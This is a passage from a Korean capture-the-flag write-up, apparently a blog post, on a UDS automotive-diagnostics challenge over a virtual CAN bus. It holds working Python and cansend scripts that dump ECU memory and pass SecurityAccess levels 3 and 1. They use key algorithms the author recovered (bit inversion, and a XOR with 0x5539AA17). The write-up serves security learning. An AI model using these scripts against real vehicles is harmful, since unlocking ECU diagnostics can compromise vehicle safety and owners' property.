&#xC8FC;&#xC18C;&#xC640; 1&#xBC14;&#xC774;&#xD2B8; &#xAE38;&#xC774; &#xD3EC;&#xB9F7;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xC694;&#xCCAD;&#xD558;&#xB294; <code>14</code> &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; 255(<code>FF</code>)&#xB9CC;&#xD07C; &#xC77D;&#xAE30; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xBA74; &#xC77D;&#xAE30;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> struct<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)    <span class="hljs-keyword">return</span> can_id, data[:dlc]recvdata = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))    p.settimeout(<span class="hljs-number">0.5</span>)    <span class="hljs-keyword">for</span> addr <span class="hljs-keyword">in</span> range(<span class="hljs-number">0xC3F83000</span>, <span class="hljs-number">0xC3F865ff</span>, <span class="hljs-number">0xFF</span>):        req_data = <span class="hljs-string">b&quot;\x07\x23\x14&quot;</span> + addr.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;big&quot;</span>) + <span class="hljs-string">b&quot;\xff&quot;</span>        p.send(build_can_frame(<span class="hljs-number">0x7DF</span>, req_data))        <span class="hljs-keyword">try</span>:            resp_frame = p.recv(<span class="hljs-number">16</span>)            resp_id, resp_data = dissect_can_frame(resp_frame)            <span class="hljs-keyword">if</span> resp_data:                recvdata += resp_data.hex()[<span class="hljs-number">6</span>:]        <span class="hljs-keyword">except</span> socket.timeout:            <span class="hljs-keyword">continue</span>        flow_control_data = <span class="hljs-string">b&quot;\x30\x00\x00\x00\x00\x00\x00\x00&quot;</span>        p.send(build_can_frame(<span class="hljs-number">0x7E0</span>, flow_control_data))        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">36</span>):            <span class="hljs-keyword">try</span>:                resp_frame = p.recv(<span class="hljs-number">16</span>)                _, resp_data = dissect_can_frame(resp_frame)                tempdata = resp_data.hex()[<span class="hljs-number">2</span>:]                <span class="hljs-keyword">if</span> tempdata != <span class="hljs-string">&quot;00000000000000&quot;</span>:                    recvdata += tempdata            <span class="hljs-keyword">except</span> socket.timeout:                <span class="hljs-keyword">break</span>    hex_data_string = recvdata    <span class="hljs-keyword">try</span>:        byte_data = bytes.fromhex(hex_data_string)        ascii_string = byte_data.decode(<span class="hljs-string">&quot;ascii&quot;</span>, errors=<span class="hljs-string">&quot;ignore&quot;</span>)        print(ascii_string)            <span class="hljs-keyword">except</span> ValueError:        print(<span class="hljs-string">&quot;error&quot;</span>)</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; 0xC3F83000 &#xB300;&#xC5ED;&#xC758; &#xB370;&#xC774;&#xD130;&#xB4E4;&#xC744; &#xD30C;&#xC2F1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>CAN &#xD1B5;&#xC2E0;&#xC5D0;&#xC11C;&#xB294; python&#xC758; <code>can</code> &#xBAA8;&#xB4C8;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC77C;&#xBC18;&#xC801;&#xC774;&#xC9C0;&#xB9CC;, &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD658;&#xACBD;&#xC5D0;&#xC11C;&#xB294; <code>can</code> &#xBAA8;&#xB4C8;&#xC774; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xADF8;&#xB807;&#xAC8C; &#xB54C;&#xBB38;&#xC5D0; <code>socket</code> &#xBAA8;&#xB4C8;&#xB85C; &#xB300;&#xCCB4;&#xD558;&#xC5EC; &#xC791;&#xC131;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>python <code>socket</code> &#xBAA8;&#xB4C8;&#xB85C; CAN &#xD3EC;&#xB9F7;&#xC744; &#xD45C;&#xD604;&#xD560; &#xB54C;&#xB294; <code>=IB3x8s</code>&#xB97C; &#xC778;&#xC790;&#xB85C; &#xC8FC;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image20.png" alt="image20.png"></p><p>&#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xBA54;&#xBAA8;&#xB9AC; &#xC0C1;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; flag&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="3-5-Security-Access-Level-3"><a href="#3-5-Security-Access-Level-3" class="headerlink" title="3.5. Security Access Level 3"></a>3.5. Security Access Level 3</h3><p><img src="image21.png" alt="image21.png"></p><p>&#xC774;&#xBC88; &#xBB38;&#xC81C;&#xB294; &#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4; &#xB808;&#xBCA8; 3&#xC5D0; &#xC554;&#xD638;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC54C;&#xC544;&#xB0B4;&#xC5B4;&#xC11C;, 0x1337&#xC774;&#xB77C;&#xB294; seed &#xAC12;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; key &#xAC12;&#xC744; &#xCC3E;&#xB294; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xAC83;&#xCC98;&#xB7FC; &#xC774;&#xBC88; &#xB808;&#xBCA8; 3&#xC5D0;&#xC11C;&#xB294; seed &#xAC12;&#xACFC; key &#xAC12;&#xC758; &#xAE38;&#xC774;&#xB294; 2 byte &#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="image22.png" alt="[image22.png](https://blog.naver.com/suresofttech/223327497814)"></p><p>&#xBA3C;&#xC800;, UDS&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4; &#xAE30;&#xB2A5;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4;&#xB294; ECU&#xC5D0; &#xB300;&#xD55C; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xC81C;&#xC5B4;&#xD558;&#xB294; &#xC11C;&#xBE44;&#xC2A4; &#xC785;&#xB2C8;&#xB2E4;. &#xB808;&#xBCA8;&#xC740; &#xC22B;&#xC790;&#xAC00; &#xB192;&#xC744; &#xC218;&#xB85D; &#xB192;&#xC740; &#xAD8C;&#xD55C;&#xC758; &#xB808;&#xBCA8;&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xBA74; &#xD3B8;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xC804;&#xC5D0; &#xC9C4;&#xB2E8;(<code>10</code>) &#xD655;&#xC7A5; &#xC138;&#xC158;(<code>03</code>)&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xD55C; &#xC774;&#xD6C4;&#xC5D0;, SID <code>27</code>&#xB85C; &#xC0AC;&#xC6A9;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><p>seed &#xAC12;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xB0B4;&#xBD80; &#xC554;&#xD638;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xD1B5;&#xD574; key&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9;&#xD558;&#xB294; key &#xAC12;&#xC5D0; &#xC778;&#xC99D;&#xC774; &#xC131;&#xACF5;&#xD558;&#xBA74; &#xC561;&#xC138;&#xC2A4;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD1B5;&#xC2E0;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C;, key &#xAC12;&#xC744; &#xBCF4;&#xB0BC; &#xB54C;&#xB9CC; &#xC811;&#xADFC;&#xD558;&#xB824;&#xB294; &#xC561;&#xC138;&#xC2A4; &#xB808;&#xBCA8; &#xAC12;&#xC5D0; +1&#xD55C; &#xAC12;&#xC73C;&#xB85C; &#xC694;&#xCCAD;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image23.png" alt="image23.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 02(DLC:len) 10(SID:DiagnosticSessionControl) 03(SubFunc:ExtendedSession)</span>cansend vcan0 7E0<span class="hljs-comment">#021003</span><span class="hljs-comment"># 02(DLC:len) 27(SID:SecurityAccess) 03(Level)</span>cansend vcan0 7E0<span class="hljs-comment">#022703</span><span class="hljs-comment"># 04(DLC:len) 27(SID:SecurityAccess) 04(Level+1) KEYS</span>cansend vcan0 7E0<span class="hljs-comment">#042704KEYS</span></code></pre><p>&#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4; &#xC778;&#xC99D; &#xC2DC;&#xD000;&#xC2A4;&#xC5D0; &#xB530;&#xB77C;&#xC11C; &#xB808;&#xBCA8; 3&#xC5D0; &#xB300;&#xD55C; &#xC778;&#xC99D;&#xC744; &#xC9C4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC6B0;&#xC120; &#xC9C4;&#xB2E8; &#xD655;&#xC7A5; &#xC138;&#xC158;(<code>1030</code>)&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xD55C; &#xC774;&#xD6C4;, &#xBCF4;&#xC548; &#xC5D1;&#xC138;&#xC2A4; &#xB808;&#xBCA8; 3(<code>2703</code>) &#xC694;&#xCCAD;&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xB41C; <code>7E53</code>&#xC774;&#xB77C;&#xB294; seed &#xAC12;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; key &#xAC12;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xBA74; &#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4; RSID(<code>67</code>)&#xC744; &#xD655;&#xC778;&#xD558;&#xBA74;&#xC11C;, &#xBCF4;&#xC548; &#xC5D1;&#xC138;&#xC2A4;&#xC5D0; &#xC131;&#xACF5;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC554;&#xD638;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; seed &#xAC12;&#xC744; &#xBE44;&#xD2B8; &#xBC18;&#xC804;&#xD558;&#xB294; &#xAC04;&#xB2E8;&#xD55C; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; flag&#xB294; <code>0x1337 ^ 0xFFFF</code>&#xB97C; &#xD55C; &#xACB0;&#xACFC;&#xB85C; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"> <span class="hljs-comment"># security access level 3 pass</span><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> struct<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)    <span class="hljs-keyword">return</span> can_id, data<span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))    data1 = <span class="hljs-string">b&quot;\x02\x10\x03\x00\x00\x00\x00\x00&quot;</span>    frame1 = build_can_frame(<span class="hljs-number">0x7E0</span>, data1)    p.send(frame1)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E0</span>:            <span class="hljs-keyword">break</span>    data2 = <span class="hljs-string">b&quot;\x02\x27\x03\x00\x00\x00\x00\x00&quot;</span>    frame2 = build_can_frame(<span class="hljs-number">0x7E0</span>, data2)    p.send(frame2)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E0</span>:            <span class="hljs-keyword">break</span>    seed = msg_data.hex()[<span class="hljs-number">6</span>:<span class="hljs-number">10</span>]    print(<span class="hljs-string">f&quot;Seed: <span class="hljs-subst">{seed}</span>&quot;</span>)        key = <span class="hljs-string">f&quot;<span class="hljs-subst">{~int(seed, <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFF</span>:<span class="hljs-number">04</span>X}</span>&quot;</span>    print(<span class="hljs-string">f&quot;Keys: <span class="hljs-subst">{key}</span>&quot;</span>)        key_bytes = int(key, <span class="hljs-number">16</span>).to_bytes(<span class="hljs-number">2</span>, <span class="hljs-string">&apos;big&apos;</span>)    data3 = <span class="hljs-string">b&quot;\x04\x27\x04&quot;</span> + key_bytes + <span class="hljs-string">b&quot;\x00\x00\x00&quot;</span>    frame3 = build_can_frame(<span class="hljs-number">0x7E0</span>, data3)    p.send(frame3)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E0</span>:            <span class="hljs-keyword">break</span>        print(<span class="hljs-string">&quot;Security access level 3 unlock!&quot;</span>)</code></pre><p><img src="image24.png" alt="image24.png"></p><p>&#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; seed &#xAC12; &#xD655;&#xC778; &#xC774;&#xD6C4;&#xC5D0; &#xB9E4;&#xC6B0; &#xC9E7;&#xC740; &#xC2DC;&#xAC04;&#xC5D0; &#xC5F0;&#xC0B0;&#xD55C; key &#xAC12;&#xC744; &#xC804;&#xC1A1;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC704;&#xCC98;&#xB7FC; &#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD558;&#xB294; &#xAC83;&#xC744; &#xAD8C;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;(&#xBB3C;&#xB860; &#xC190;&#xC774; &#xBE60;&#xB974;&#xB2E4;&#xBA74; &#xC9C1;&#xC811; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;).</p><h3 id="3-6-Security-Access-Level-1"><a href="#3-6-Security-Access-Level-1" class="headerlink" title="3.6. Security Access Level 1"></a>3.6. Security Access Level 1</h3><p><img src="image25.png" alt="image25.png"></p><p>&#xC774;&#xBC88; &#xBB38;&#xC81C;&#xB294; <code>0x1A000</code> &#xB300;&#xC5ED; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB300;&#xD55C; &#xC77D;&#xAE30;&#xB97C; &#xD1B5;&#xD574; &#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4; &#xB808;&#xBCA8; 1 &#xC554;&#xD638;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC54C;&#xC544;&#xB0B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. flag&#xB294; 0x7D0E1A5C&#xAC00; seed&#xC77C; &#xB54C;&#xC758; key &#xAC12;&#xC785;&#xB2C8;&#xB2E4;. &#xB808;&#xBCA8; 1&#xC758; seed &#xAC12;&#xACFC; key &#xAC12;&#xC758; &#xAE38;&#xC774;&#xB294; 4 byte&#xC778; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD76C;&#xD55C;&#xD558;&#xAC8C; UDS Challenge&#xC5D0;&#xC11C;&#xB294; &#xB808;&#xBCA8; 1&#xC774; &#xB808;&#xBCA8; 3&#xBCF4;&#xB2E4; &#xB4A4;&#xC5D0; &#xBC30;&#xCE58;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-comment"># read memory</span><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> struct<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)    <span class="hljs-keyword">return</span> can_id, dlc, datarecvdata = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:    can_id_filter = <span class="hljs-number">0x7E8</span>    can_mask_filter = <span class="hljs-number">0xFFF</span>    can_filter = struct.pack(<span class="hljs-string">&quot;=II&quot;</span>, can_id_filter, can_mask_filter)    p.setsockopt(socket.SOL_CAN_RAW, socket.CAN_RAW_FILTER, can_filter)    p.setsockopt(socket.SOL_CAN_RAW, socket.CAN_RAW_RECV_OWN_MSGS, <span class="hljs-number">0</span>)    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))    <span class="hljs-keyword">for</span> hex_value <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x1A000</span>, <span class="hljs-number">0x1B000</span>, <span class="hljs-number">0xFF</span>):        candata = <span class="hljs-string">b&quot;\x07\x23\x14&quot;</span> + hex_value.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;big&quot;</span>) + <span class="hljs-string">b&quot;\xff&quot;</span>                data1 = <span class="hljs-string">b&quot;\x02\x10\x02\x00\x00\x00\x00\x00&quot;</span>        frame1 = build_can_frame(<span class="hljs-number">0x7DF</span>, data1)        p.send(frame1)                frame_r1 = p.recv(<span class="hljs-number">16</span>)                frame2 = build_can_frame(<span class="hljs-number">0x7DF</span>, candata)        p.send(frame2)                frame_r2 = p.recv(<span class="hljs-number">16</span>)        can_id2, dlc2, data_r2 = dissect_can_frame(frame_r2)                recvdata += data_r2.hex()[<span class="hljs-number">6</span>:]                data3 = <span class="hljs-string">b&quot;\x30\x00\x00\x00\x00\x00\x00\x00&quot;</span>        frame3 = build_can_frame(<span class="hljs-number">0x7E0</span>, data3)        p.send(frame3)                temp = <span class="hljs-number">0</span>        <span class="hljs-keyword">while</span> temp &lt; <span class="hljs-number">36</span>:            frame_r_loop = p.recv(<span class="hljs-number">16</span>)            can_id_loop, dlc_loop, data_loop = dissect_can_frame(frame_r_loop)                        tempdata = data_loop.hex()[<span class="hljs-number">2</span>:]                        <span class="hljs-keyword">if</span> tempdata != <span class="hljs-string">&quot;00000000000000&quot;</span>:                recvdata += tempdata            temp = temp + <span class="hljs-number">1</span>print(<span class="hljs-string">f&quot;recv data: <span class="hljs-subst">{recvdata}</span>&quot;</span>)</code></pre><p>&#xBA3C;&#xC800;, <code>0x1A000</code> &#xB300;&#xC5ED; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB300;&#xD55C; &#xC77D;&#xAE30;&#xB97C; &#xC218;&#xD589;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p><img src="image26.png" alt="image26.png"></p><p>&#xC774;&#xC804;&#xC5D0; &#xB808;&#xBCA8; 3&#xB97C; &#xC778;&#xC99D;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xBA3C;&#xC800; &#xC2E4;&#xD589;&#xD574;&#xC11C; &#xB808;&#xBCA8; 3 &#xC778;&#xC99D;&#xC744; &#xD1B5;&#xACFC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xADF8; &#xC774;&#xD6C4;&#xC5D0; &#xBC29;&#xAE08; &#xC791;&#xC131;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC77D;&#xAE30; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74;, 4 byte &#xAC12;&#xC774; 2&#xBC88; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xAC12;&#xC740; &#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4; &#xB808;&#xBCA8; 1 &#xC694;&#xCCAD;&#xC744; &#xD1B5;&#xD574; seed &#xAC12;&#xC744; &#xC0DD;&#xC131;&#xD560; &#xB54C;&#xB9C8;&#xB2E4; &#xB2EC;&#xB77C;&#xC9C0;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>hex(<span class="hljs-number">0x983cb51b</span> ^ <span class="hljs-number">0xcd051f0c</span>)<span class="hljs-string">&apos;0x5539aa17&apos;</span><span class="hljs-meta">&gt;&gt;&gt; </span>hex(<span class="hljs-number">0xddee9870</span> ^ <span class="hljs-number">0x88d73267</span>)<span class="hljs-string">&apos;0x5539aa17&apos;</span><span class="hljs-meta">&gt;&gt;&gt; </span>hex(<span class="hljs-number">0x4a4499ad</span> ^ <span class="hljs-number">0x1f7d33ba</span>)<span class="hljs-string">&apos;0x5539aa17&apos;</span></code></pre><p>&#xD574;&#xB2F9; &#xAC12;&#xB4E4;&#xC744; XOR &#xC5F0;&#xC0B0;&#xC744; &#xD558;&#xBA74; <code>0x5539aa17</code>&#xC774;&#xB77C;&#xB294; &#xACE0;&#xC815;&#xC801;&#xC778; &#xAC12;&#xC774; &#xB098;&#xC624;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB97C; &#xD1B5;&#xD574; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; seed &#xAC12;&#xACFC; &#xC5F0;&#xC0B0;&#xD55C; key &#xAC12;&#xC774; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC5F0;&#xC0B0; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC740; <code>seed ^ 0x5539aa17</code>&#xC774;&#xB77C;&#xB294; &#xAC83; &#xC5ED;&#xC2DC; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image28.png" alt="image27.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 02(DLC:len) 10(SID:DiagnosticSessionControl) 03(SubFunc:ExtendedSession)</span>cansend vcan0 7E0<span class="hljs-comment">#021003</span><span class="hljs-comment"># 02(DLC:len) 27(SID:SecurityAccess) 01(Level)</span>cansend vcan0 7E0<span class="hljs-comment">#022701</span><span class="hljs-comment"># 06(PCI:len) 27(SID:SecurityAccess) 02(Level+1) KEYSKEYS</span>cansend vcan0 7E0<span class="hljs-comment">#062702KEYSKEYS</span></code></pre><p>&#xC54C;&#xC544;&#xB0B8; &#xC554;&#xD638;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xD1B5;&#xD574; &#xBCF4;&#xC548; &#xC561;&#xC138;&#xC2A4; &#xB808;&#xBCA8; 1 &#xC778;&#xC99D;&#xC744; &#xC2DC;&#xB3C4;&#xD558;&#xBA74;, RSID(<code>67</code>)&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA70; &#xC131;&#xACF5;&#xD558;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-comment"># security access level 1 pass</span><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> struct<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_can_frame</span>(<span class="hljs-params">can_id, data</span>):</span>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, can_id, len(data), data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dissect_can_frame</span>(<span class="hljs-params">frame</span>):</span>    can_id, dlc, data = struct.unpack(<span class="hljs-string">&quot;=IB3x8s&quot;</span>, frame)    <span class="hljs-keyword">return</span> can_id, data<span class="hljs-keyword">with</span> socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) <span class="hljs-keyword">as</span> p:    p.bind((<span class="hljs-string">&quot;vcan0&quot;</span>,))    data1 = <span class="hljs-string">b&quot;\x02\x10\x03\x00\x00\x00\x00\x00&quot;</span>    frame1 = build_can_frame(<span class="hljs-number">0x7E0</span>, data1)    p.send(frame1)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E8</span>:            <span class="hljs-keyword">continue</span>        <span class="hljs-keyword">break</span>    data2 = <span class="hljs-string">b&quot;\x02\x27\x01\x00\x00\x00\x00\x00&quot;</span>    frame2 = build_can_frame(<span class="hljs-number">0x7E0</span>, data2)    p.send(frame2)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E8</span>:            <span class="hljs-keyword">continue</span>        <span class="hljs-keyword">break</span>    seed_bytes = msg_data[<span class="hljs-number">3</span>:<span class="hljs-number">7</span>]    seed_int = int.from_bytes(seed_bytes, <span class="hljs-string">&apos;big&apos;</span>)    print(<span class="hljs-string">f&quot;Seed: <span class="hljs-subst">{seed_int:<span class="hljs-number">08</span>X}</span>&quot;</span>)    key_int = seed_int ^ <span class="hljs-number">0x5539AA17</span>    print(<span class="hljs-string">f&quot;Key: <span class="hljs-subst">{key_int:<span class="hljs-number">08</span>X}</span>&quot;</span>)    key_bytes = key_int.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&apos;big&apos;</span>)    data3 = <span class="hljs-string">b&quot;\x06\x27\x02&quot;</span> + key_bytes    frame3 = build_can_frame(<span class="hljs-number">0x7E0</span>, data3)    p.send(frame3)    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        frame_r = p.recv(<span class="hljs-number">16</span>)        can_id, msg_data = dissect_can_frame(frame_r)        <span class="hljs-keyword">if</span> can_id != <span class="hljs-number">0x7E8</span>:            <span class="hljs-keyword">continue</span>        <span class="hljs-keyword">break</span>    print(<span class="hljs-string">&quot;Security access level 1 